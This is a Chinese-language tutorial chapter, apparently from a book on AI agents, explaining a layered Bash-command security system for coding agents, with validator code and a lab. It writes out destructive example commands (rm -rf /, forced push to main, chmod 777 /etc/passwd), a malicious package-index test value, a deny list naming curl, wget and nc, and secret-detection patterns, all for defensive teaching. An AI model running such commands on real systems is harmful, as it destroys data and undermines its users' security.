---
title: 第七章：安全架构——在沙箱中让 AI 工作
date: 2026-01-07 00:00:00
categories: Agents
tags: [AI, Agent, Python, Claude, SDK]
---

# 第七章：安全架构——在沙箱中让 AI 工作

> "给 AI 工具是必须的，但让 AI 做任何事是危险的。"

## 7.1 为什么 AI 智能体需要特殊的安全考量

传统软件的安全模型很清晰：程序按照代码执行，代码是你写的，你知道它会做什么。

AI 智能体打破了这个假设。Claude 可以：
- 自主决定执行哪些 Bash 命令
- 读写任意文件（如果你给了权限）
- 调用任意网络资源

当你对一个开发者说"帮我实现登录功能"，最坏情况是他理解错了需求，写出需要重构的代码。但当你对 AI 智能体说同样的话，最坏情况可能是：

```bash
# 智能体可能执行的危险命令
rm -rf ./node_modules     # 清理，但误删了整个目录
git push --force origin main  # 强推，覆盖了团队的工作
curl -X DELETE https://api.production.com/users  # 误操作生产 API
chmod 777 /etc/passwd     # 修改了系统文件权限
```

这些操作有些是"善意的误操作"（智能体以为在做正确的事），有些可能是"提示词注入"（恶意内容诱导智能体执行危险命令）。

Auto-Claude 构建了一个多层安全架构来应对这些威胁。

## 7.2 安全架构全景

```
用户请求
    │
    ▼
┌────────────────────────────────────────┐
│  Layer 1: OS 沙箱                       │  操作系统级隔离
│  (claude_agent_sdk sandbox setting)    │
└────────────────┬───────────────────────┘
                 │
                 ▼
┌────────────────────────────────────────┐
│  Layer 2: 文件系统许可列表              │  路径访问控制
│  (create_client() filesystem perms)    │
└────────────────┬───────────────────────┘
                 │
                 ▼
┌────────────────────────────────────────┐
│  Layer 3: Bash 命令许可列表            │  命令白名单
│  (security/hooks.py PreToolUse)        │
└────────────────┬───────────────────────┘
                 │
                 ▼
┌────────────────────────────────────────┐
│  Layer 4: 命令语义验证器               │  参数安全验证
│  (security/validator.py validators)    │
└────────────────────────────────────────┘
```

四层防御，每层独立。即使某一层被绕过，下一层仍然有效。

## 7.3 第一层：OS 沙箱

最底层是操作系统级沙箱，由 Claude Agent SDK 的 `sandbox` 设置启用：

```python
# apps/backend/core/client.py（简化）

options = ClaudeAgentOptions(
    # ...其他配置...
    sandbox=True,  # 启用 OS 级沙箱
)
```

`sandbox=True` 在 macOS 上使用 Seatbelt（`sandbox-exec`），在 Linux 上使用 seccomp 限制智能体进程能调用的系统调用集合。例如，沙箱中的进程无法调用 `fork()` 创建子进程，无法修改自身的文件描述符表，无法访问网络原始套接字等。

这是最底层、最强硬的隔离。它不依赖任何应用层逻辑，即使应用层代码完全被绕过，OS 沙箱仍然有效。

## 7.4 第二层：文件系统许可列表

如第四章所述，`create_client()` 为每个智能体生成精确的文件系统访问许可：

```python
# 典型的 Coder 智能体许可
allowed_paths = [
    "/project/.auto-claude/worktrees/001-auth",  # 工作目录：读写
    "/project/.auto-claude/specs/001-auth",       # 规格文档：只读
    "/project",                                   # 项目根目录：只读
    "/tmp",                                       # 临时目录：读写
]
```

智能体无法访问列表之外的任何路径。即使 Bash 命令本身是合法的，如果它试图操作未授权路径，SDK 会拒绝执行。

## 7.5 第三层：Bash 命令钩子

这是 Auto-Claude 安全系统中最精密的部分：`PreToolUse` 钩子。

### 钩子机制

Claude Agent SDK 支持"钩子"：在工具调用**执行前**拦截并检查。`bash_security_hook` 就是注册在 `Bash` 工具的 `PreToolUse` 钩子上：

```python
# security/hooks.py

async def bash_security_hook(
    input_data: dict[str, Any],
    tool_use_id: str | None = None,
    context: Any | None = None,
) -> dict[str, Any]:
    """
    PreToolUse 钩子：在 Bash 命令执行前验证。

    返回 {} → 允许执行
    返回 {"hookSpecificOutput": {"permissionDecision": "deny", ...}} → 拒绝
    """
    if input_data.get("tool_name") != "Bash":
        return {}  # 只处理 Bash 工具

    tool_input = input_data.get("tool_input")

    # 防御性检查：结构异常直接拒绝
    if tool_input is None:
        return _deny("Bash tool_input is None - malformed tool call from SDK")

    if not isinstance(tool_input, dict):
        return _deny(f"Bash tool_input must be dict, got {type(tool_input).__name__}")

    command = tool_input.get("command", "")
    if not command:
        return {}  # 空命令允许（由 SDK 处理）

    # 确定工作目录（用于加载安全配置）
    cwd = _resolve_cwd(input_data, context)

    # 加载项目安全配置
    profile = get_security_profile(Path(cwd))

    # 提取命令列表（处理管道、&&、|| 等组合命令）
    commands = extract_commands(command)
    if not commands:
        return _deny(f"Could not parse command: {command}")

    # 逐个命令验证
    for cmd in commands:
        is_allowed, reason = is_command_allowed(cmd, profile)
        if not is_allowed:
            return _deny(reason)

        # 对敏感命令进行更深入的参数验证
        if cmd in VALIDATORS:
            allowed, reason = VALIDATORS[cmd](get_full_segment(cmd, command))
            if not allowed:
                return _deny(reason)

    return {}  # 所有命令通过验证，允许执行
```

### 工作目录解析的优先级

```python
# 工作目录解析（Priority 从高到低）
cwd = os.environ.get(PROJECT_DIR_ENV_VAR)     # 1. 环境变量（最可信）
if not cwd:
    cwd = input_data.get("cwd")               # 2. SDK 传入的 cwd
if not cwd and context and hasattr(context, "cwd"):
    cwd = context.cwd                          # 3. 上下文 cwd
if not cwd:
    cwd = os.getcwd()                          # 4. 当前目录（兜底）
```

这个优先级顺序确保安全系统总能获得正确的工作目录来加载安全配置文件。

`★ Insight ─────────────────────────────────────`

**失败安全（Fail-Safe）原则**：注意 `extract_commands()` 失败时的处理：`return _deny()`。这是"失败安全"原则——当系统无法解析一个命令时，默认**拒绝**而不是**允许**。这与"失败开放"（fail-open）相反。在安全系统中，宁愿误杀一个合法命令，也不放过一个危险命令。

`─────────────────────────────────────────────────`

## 7.6 动态安全配置文件

不同项目需要不同的 Bash 命令集。一个 Node.js 项目需要 `npm`；一个 Python 项目需要 `pytest`；一个 Go 项目需要 `go`。

Auto-Claude 使用**动态安全配置文件**解决这个问题：

```python
# security/profile.py（概念化）

def get_security_profile(project_dir: Path) -> SecurityProfile:
    """
    根据项目特征生成安全配置。

    从项目分析结果中推断：
    - 使用什么语言/框架？
    - 需要哪些构建工具？
    - 有哪些自定义脚本？
    """
    profile = SecurityProfile()

    # 基础命令：所有项目都允许
    profile.base_commands = BASE_COMMANDS.copy()

    # 加载项目分析结果
    project_analysis = load_project_analysis(project_dir)

    # 根据技术栈添加允许的命令
    if "python" in project_analysis.languages:
        profile.add_commands(PYTHON_COMMANDS)  # python, pip, pytest, ruff...
    if "javascript" in project_analysis.languages:
        profile.add_commands(NODE_COMMANDS)    # node, npm, npx, pnpm...
    if "go" in project_analysis.languages:
        profile.add_commands(GO_COMMANDS)      # go, gofmt, golint...

    # 加载项目自定义的额外命令（.auto-claude/allowed_commands.json）
    custom = load_custom_commands(project_dir)
    profile.add_commands(custom)

    return profile
```

`BASE_COMMANDS` 是所有项目共享的安全基础命令集，包含 `ls`, `cat`, `echo`, `mkdir`, `cp` 等无害命令。技术栈特定命令在基础之上叠加。

## 7.7 第四层：命令语义验证器

仅仅允许一个命令名称（如 `rm`）是不够的。`rm /` 和 `rm ./temp.txt` 都是 `rm` 命令，但危险程度天壤之别。

`VALIDATORS` 字典对特定高风险命令注册了深度语义验证器：

### rm 验证器

```python
# security/filesystem_validators.py

# 危险的 rm 参数模式
DANGEROUS_RM_PATTERNS = [
    r"^/$",         # 根目录
    r"^\.\.$",      # 父目录
    r"^~$",         # Home 目录
    r"^\*$",        # 纯通配符
    r"^/\*$",       # 根目录通配
    r"^\.\./",      # 路径逃逸
    r"^/home$",     # /home
    r"^/usr$",      # /usr
    r"^/etc$",      # /etc
    # ... 更多系统目录
]

def validate_rm_command(command_string: str) -> ValidationResult:
    """验证 rm 命令：拒绝危险模式。"""
    tokens = shlex.split(command_string)
    files = [t for t in tokens[1:] if not t.startswith("-")]

    for file_path in files:
        for pattern in DANGEROUS_RM_PATTERNS:
            if re.match(pattern, file_path):
                return False, f"Dangerous rm target: '{file_path}' matches pattern '{pattern}'"

    return True, ""
```

### chmod 验证器

```python
# security/filesystem_validators.py

# 只允许"使文件可执行"的 chmod 模式
SAFE_CHMOD_MODES = {
    "+x", "a+x", "u+x", "g+x", "ug+x",
    "755", "644", "700", "600", "775", "664",
}

def validate_chmod_command(command_string: str) -> ValidationResult:
    """
    只允许有限的 chmod 模式。
    禁止：chmod 777, chmod -R 777, chmod o+w 等危险模式。
    """
    tokens = shlex.split(command_string)
    mode = next((t for t in tokens[1:] if not t.startswith("-")), None)

    if mode and mode not in SAFE_CHMOD_MODES:
        return False, f"chmod mode '{mode}' not in allowed set: {SAFE_CHMOD_MODES}"

    return True, ""
```

### git config 验证器

这是一个特别有意思的验证器，防止智能体覆盖用户的 Git 身份：

```python
# security/git_validators.py

# 智能体不能修改的 Git 配置键
BLOCKED_GIT_CONFIG_KEYS = {
    "user.name",
    "user.email",
    "author.name",
    "author.email",
    "committer.name",
    "committer.email",
}

def validate_git_config(command_string: str) -> ValidationResult:
    """
    阻止智能体修改 Git 身份配置。

    原因：
    1. 破坏 commit 归属（commit 会显示为 "AI Agent" 而非开发者）
    2. 可能创建伪造的身份（"Test User <test@example.com>"）
    3. 覆盖用户的全局 git 配置

    注意：只读操作（--get, --list）不受限制。
    """
    tokens = shlex.split(command_string)

    # 只读操作允许
    read_only_flags = {"--get", "--get-all", "--get-regexp", "--list", "-l"}
    for token in tokens[2:]:
        if token in read_only_flags:
            return True, ""

    # 找出配置键
    config_key = next(
        (t.lower() for t in tokens[2:] if not t.startswith("-")),
        None
    )

    if config_key and config_key in BLOCKED_GIT_CONFIG_KEYS:
        return False, (
            f"Setting '{config_key}' is blocked. "
            "Agents should inherit git identity from user's global config."
        )

    return True, ""
```

这个验证器防止了一个真实场景：AI 智能体在实现"测试"功能时，可能会执行 `git config user.email "test@test.com"` 来配置测试用户，但这会永久覆盖开发者的 Git 身份配置。

### 数据库验证器

```python
# security/database_validators.py（概念化）

def validate_dropdb_command(command_string: str) -> ValidationResult:
    """
    严格限制 dropdb：只允许删除测试数据库。
    """
    tokens = shlex.split(command_string)
    db_name = tokens[-1] if tokens else ""

    # 只允许明确标识为测试的数据库名
    SAFE_TEST_PATTERNS = [r"^test_", r"_test$", r"^test$"]
    is_test_db = any(re.match(p, db_name) for p in SAFE_TEST_PATTERNS)

    if not is_test_db:
        return False, (
            f"dropdb blocked: '{db_name}' doesn't look like a test database. "
            "Only databases matching test_* or *_test are allowed."
        )

    return True, ""
```

即使 `dropdb` 命令在许可列表中，也只能删除名称符合测试模式的数据库。删除 `production_db` 会被直接拦截。

### kill/pkill 验证器

```python
# security/process_validators.py（概念化）

def validate_pkill_command(command_string: str) -> ValidationResult:
    """
    pkill 验证：只允许杀死项目相关的进程。

    阻止：pkill -9 -1（杀死所有进程）
    阻止：pkill python（太宽泛）
    允许：pkill -f "pytest test_auth.py"（精确匹配）
    """
    tokens = shlex.split(command_string)

    # 检查是否有 -1（杀死所有进程）
    if "-1" in tokens:
        return False, "pkill -1 (kill all processes) is not allowed"

    # 检查是否使用 -f 精确模式匹配
    has_full_match = "-f" in tokens

    if not has_full_match:
        # 没有 -f 的 pkill 是按进程名匹配，太宽泛
        return False, "pkill without -f flag is too broad. Use pkill -f '<pattern>' for precise matching"

    return True, ""
```

## 7.8 命令提取器：解析复杂 Shell 命令

验证单个命令容易，但智能体经常执行复杂的组合命令：

```bash
cd /tmp && npm install && npm run build || echo "Build failed"
pytest tests/ | tee results.txt; rm -f /tmp/cache
```

`extract_commands()` 函数需要从这些复杂表达式中提取出所有实际执行的命令：

```python
# security/parser.py（概念化）

def extract_commands(command_string: str) -> list[str]:
    """
    从复杂 Shell 命令中提取所有子命令名称。

    处理：
    - 顺序执行：cmd1 && cmd2 || cmd3 ; cmd4
    - 管道：cmd1 | cmd2
    - 命令替换：$(cmd) 或 `cmd`
    - 子 Shell：(cmd1; cmd2)

    返回：所有命令的名称列表（不含参数）
    """
    commands = []
    # 按 shell 操作符分割
    segments = re.split(r'[;&|]|\|\|', command_string)

    for segment in segments:
        segment = segment.strip()
        if not segment:
            continue

        # 提取第一个词（命令名）
        parts = shlex.split(segment)
        if parts:
            cmd = parts[0]
            # 处理路径（/usr/bin/python → python）
            cmd = os.path.basename(cmd)
            # 处理 env prefix（env FOO=bar python → python）
            if cmd == "env":
                cmd = _extract_after_env(parts)
            commands.append(cmd)

    return commands
```

这个解析器是整个安全系统的"神经末梢"。它必须足够精确以识别真正的命令，又足够保守以在解析失败时默认拒绝。

`★ Insight ─────────────────────────────────────`

**Shell 解析的不可完备性**：完整的 Shell 命令解析极其复杂（变量展开、heredoc、进程替换...）。`extract_commands()` 故意只解析常见模式，遇到无法解析的命令直接拒绝。这种"保守解析"的策略对安全系统是正确的：宁愿拒绝合法命令，不接受不确定命令。

`─────────────────────────────────────────────────`

## 7.9 秘密扫描：Git Commit 的最后防线

智能体可能在无意中将 API Key、密码等敏感信息写入代码文件，然后 commit 到 Git。`validate_git_commit` 在提交前扫描改动：

```python
# security/git_validators.py

# 秘密检测正则模式
SECRET_PATTERNS = [
    (r'["\']?(api[_-]?key)["\']?\s*[:=]\s*["\']([A-Za-z0-9_\-]{20,})', "API Key"),
    (r'["\']?(secret)["\']?\s*[:=]\s*["\']([A-Za-z0-9_\-]{16,})', "Secret"),
    (r'sk-[A-Za-z0-9]{32,}', "OpenAI API Key"),
    (r'ghp_[A-Za-z0-9]{36}', "GitHub Personal Access Token"),
    (r'-----BEGIN (RSA |EC )?PRIVATE KEY-----', "Private Key"),
    (r'password\s*=\s*["\'][^"\']{8,}["\']', "Hardcoded Password"),
]

def validate_git_commit(command_string: str) -> ValidationResult:
    """
    git commit 前扫描秘密。
    """
    # 获取即将提交的改动
    diff = subprocess.run(
        ["git", "diff", "--cached"],
        capture_output=True, text=True
    ).stdout

    for pattern, secret_type in SECRET_PATTERNS:
        matches = re.findall(pattern, diff, re.IGNORECASE)
        if matches:
            return False, (
                f"Potential {secret_type} detected in staged changes. "
                "Please remove secrets before committing. "
                "Use environment variables instead."
            )

    return True, ""
```

这是整个安全链条的最后一道关卡：即使智能体意外写入了密钥，在提交时也会被拦截。

## 7.10 安全配置的组合性

四层安全机制相互独立，但协同工作：

```
智能体想执行：git commit -m "Add API key"

Layer 1 OS 沙箱：
  git 命令允许访问项目目录 ✓

Layer 2 文件系统：
  .git/ 在工作目录内 ✓

Layer 3 命令许可列表：
  "git" 在 BASE_COMMANDS 中 ✓

Layer 4 语义验证器：
  validate_git_commit() → 扫描 diff
  发现："api_key = 'sk-xxx...'"
  → 拒绝！原因："Potential API Key detected in staged changes"
```

如果没有 Layer 4，这个 commit 会成功执行，敏感信息泄露到版本历史中。

反过来，即使 Layer 4 被绕过（例如通过分步操作，先 stage 后 commit），Layer 1 和 Layer 2 的沙箱隔离确保最坏情况只是泄露到本地 worktree，不会直接影响生产环境。

## 7.11 安全 vs 能力：持续的工程权衡

安全限制必然会降低智能体的能力。极端安全（什么都不允许）意味着智能体什么也做不了；极端开放（什么都允许）意味着灾难风险。

Auto-Claude 的权衡策略：

1. **最小权限开始**：BASE_COMMANDS 只包含确认安全的命令，新命令需要明确添加
2. **项目感知扩展**：根据项目技术栈自动扩展（Python 项目自动允许 `pytest`）
3. **用户可配置扩展**：`.auto-claude/allowed_commands.json` 允许项目级别的自定义
4. **操作级验证**：不是允许整个命令，而是验证具体参数

这个分层策略让安全系统既严格又实用：智能体在开发工作中基本不会受到误拦截，但真正危险的操作会被精确阻止。

---

## Lab 7.1：构建一个命令验证器

在这个实验中，你将实现一个完整的 Bash 命令验证系统，理解安全钩子的设计原理。

### 背景

你正在构建一个 AI 代码助手，需要让它能执行构建和测试命令，但不能执行危险的系统操作。

### Part A：命令许可列表

```python
# lab_07_security.py

import re
import shlex
import os
from typing import Optional

# 基础安全命令（所有项目都允许）
BASE_COMMANDS = frozenset({
    "ls", "cat", "echo", "pwd", "mkdir", "cp", "mv",
    "grep", "find", "head", "tail", "wc", "sort", "uniq",
    "git", "python", "python3", "pip",
})

# Python 项目额外命令
PYTHON_EXTRA_COMMANDS = frozenset({
    "pytest", "ruff", "mypy", "black", "isort",
    "uvicorn", "gunicorn",
})

class SecurityProfile:
    """项目安全配置。"""

    def __init__(self, extra_commands: frozenset[str] = frozenset()):
        self.allowed_commands = BASE_COMMANDS | extra_commands
        self.validators: dict[str, callable] = {}

    def register_validator(self, command: str, validator: callable):
        """为特定命令注册深度验证器。"""
        self.validators[command] = validator

    def is_command_allowed(self, command: str) -> tuple[bool, str]:
        """
        TODO Part A: 检查命令是否在许可列表中

        要求：
        1. 命令名在 self.allowed_commands 中 → 允许
        2. 否则 → 拒绝，返回清晰的错误信息
        3. 如果命令有对应的 validator，运行 validator 进一步检查

        注意：命令名是可执行文件的基础名（basename），
        例如 "/usr/bin/python3" → "python3"
        """
        pass


def extract_commands(command_string: str) -> list[str]:
    """
    TODO Part A: 从复杂 Shell 命令中提取所有子命令名

    支持：
    - cmd1 && cmd2
    - cmd1 || cmd2
    - cmd1 ; cmd2
    - cmd1 | cmd2

    如果解析失败，返回空列表（调用方应拒绝执行）。

    提示：
    - 用 re.split() 按 shell 操作符分割
    - 对每个片段用 shlex.split() 提取第一个词
    - 用 os.path.basename() 获取命令名
    """
    try:
        # TODO: 实现命令提取逻辑
        pass
    except Exception:
        return []  # 解析失败，返回空
```

### Part B：语义验证器

```python
def validate_rm(command_string: str) -> tuple[bool, str]:
    """
    TODO Part B: 实现 rm 命令验证器

    规则：
    1. 禁止 rm -rf /（根目录）
    2. 禁止 rm -rf ~（Home 目录）
    3. 禁止 rm -rf *（单纯通配符）
    4. 禁止 rm 任何 /etc/, /usr/, /bin/, /home/ 等系统目录
    5. 允许 rm ./temp.txt, rm -f build/output.js 等项目内路径
    """
    pass


def validate_git_push(command_string: str) -> tuple[bool, str]:
    """
    TODO Part B: 实现 git push 验证器

    规则：
    1. 禁止 --force 或 -f（强制推送）
    2. 禁止推送到 main 或 master 分支
    3. 允许推送到 auto-claude/* 分支（feature 分支）
    4. 允许不带分支参数的 push（推送当前分支）
    """
    pass


def validate_pip(command_string: str) -> tuple[bool, str]:
    """
    TODO Part B: 实现 pip 命令验证器

    规则：
    1. 只允许 install 和 uninstall 子命令
    2. 禁止 --index-url 参数（防止恶意包源）
    3. 禁止 pip install --no-deps（绕过依赖检查）
    4. 允许 pip install -r requirements.txt
    """
    pass
```

### Part C：安全钩子集成

```python
class SecurityHook:
    """
    模拟 PreToolUse 安全钩子。
    """

    def __init__(self, profile: SecurityProfile):
        self.profile = profile

    def check(self, tool_name: str, command: str) -> dict:
        """
        TODO Part C: 实现完整的钩子检查逻辑

        参数：
        - tool_name: 工具名（只处理 "Bash"）
        - command: 要执行的命令字符串

        返回：
        - {} → 允许
        - {"decision": "deny", "reason": "..."} → 拒绝

        逻辑：
        1. 非 Bash 工具直接允许
        2. 提取命令列表（extract_commands）
        3. 提取失败 → 拒绝（fail-safe）
        4. 每个命令通过 profile.is_command_allowed() 检查
        5. 任何命令不允许 → 拒绝，返回原因
        6. 所有命令通过 → 允许
        """
        pass


def run_tests():
    """测试安全钩子的各种场景。"""
    profile = SecurityProfile(extra_commands=PYTHON_EXTRA_COMMANDS)
    profile.register_validator("rm", validate_rm)
    profile.register_validator("git", validate_git_push)
    profile.register_validator("pip", validate_pip)

    hook = SecurityHook(profile)

    test_cases = [
        # (命令, 预期决策, 描述)
        ("pytest tests/", "allow", "pytest 在许可列表中"),
        ("rm -rf /", "deny", "rm 根目录应拒绝"),
        ("rm ./build/output.js", "allow", "rm 项目文件允许"),
        ("git push origin auto-claude/feat-001", "allow", "推送 feature 分支允许"),
        ("git push --force origin main", "deny", "强制推送 main 应拒绝"),
        ("curl https://api.example.com", "deny", "curl 不在许可列表"),
        ("pytest tests/ && rm -rf /", "deny", "组合命令中有危险命令应整体拒绝"),
        ("pip install requests", "allow", "pip install 允许"),
        ("pip install --index-url http://evil.com requests", "deny", "恶意包源应拒绝"),
    ]

    passed = 0
    failed = 0

    for command, expected, description in test_cases:
        result = hook.check("Bash", command)
        actual = "deny" if result.get("decision") == "deny" else "allow"

        if actual == expected:
            print(f"✓ {description}")
            passed += 1
        else:
            print(f"✗ {description}")
            print(f"  命令: {command}")
            print(f"  预期: {expected}, 实际: {actual}")
            if result:
                print(f"  原因: {result.get('reason', 'N/A')}")
            failed += 1

    print(f"\n结果: {passed} 通过, {failed} 失败")


if __name__ == "__main__":
    run_tests()
```

### 验证标准

| 检查点 | 预期结果 |
|--------|---------|
| 基础命令 | `ls`, `cat`, `git` 等允许 |
| 未知命令 | `curl`, `wget`, `nc` 等拒绝 |
| 组合命令 | 有一个不合法即整体拒绝 |
| rm 危险路径 | 系统目录拒绝，项目路径允许 |
| git push 强制 | `--force` 和 `main` 分支拒绝 |
| 解析失败 | 返回 deny（fail-safe）|

### 进阶挑战

1. **秘密扫描**：实现 `validate_git_commit()` 函数，在 `git commit` 前扫描 staged 文件中的 API Key 模式（OpenAI Key、GitHub Token、任意 `SECRET=xxx` 赋值）。

2. **环境变量过滤**：实现 `validate_env_vars()` 函数，阻止命令设置危险的环境变量（如 `HOME=/tmp python script.py`），防止环境变量注入攻击。

3. **审计日志**：给 `SecurityHook` 添加审计功能，记录每次"deny"决策到文件。格式：`timestamp | command | reason`。并实现 `generate_report()` 函数，统计被拒绝最多的命令类型。

---

**本章要点回顾**

- AI 智能体面临独特的安全挑战：善意误操作和提示词注入攻击
- 四层防御：OS 沙箱 → 文件系统许可 → 命令许可列表 → 语义验证器
- `PreToolUse` 钩子是拦截危险命令的关键注入点
- "Fail-Safe"原则：无法解析的命令默认拒绝，不是默认允许
- 不同命令需要不同深度的验证：`rm /` 和 `rm ./temp.txt` 都是 `rm`，但危险程度不同
- 动态安全配置文件根据项目技术栈自动扩展许可集合
- 安全与能力的平衡是持续的工程决策，不存在完美答案
